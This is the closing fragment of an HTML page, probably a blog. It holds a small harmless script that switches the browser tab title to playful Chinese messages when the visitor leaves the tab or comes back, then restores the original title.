
    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '/(ㄒoㄒ)/~~嘤嘤嘤，不要我了';
                clearTimeout(titleTime);
            } else {
                document.title = '(つェ⊂)来啦官人';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
</body>
</html>
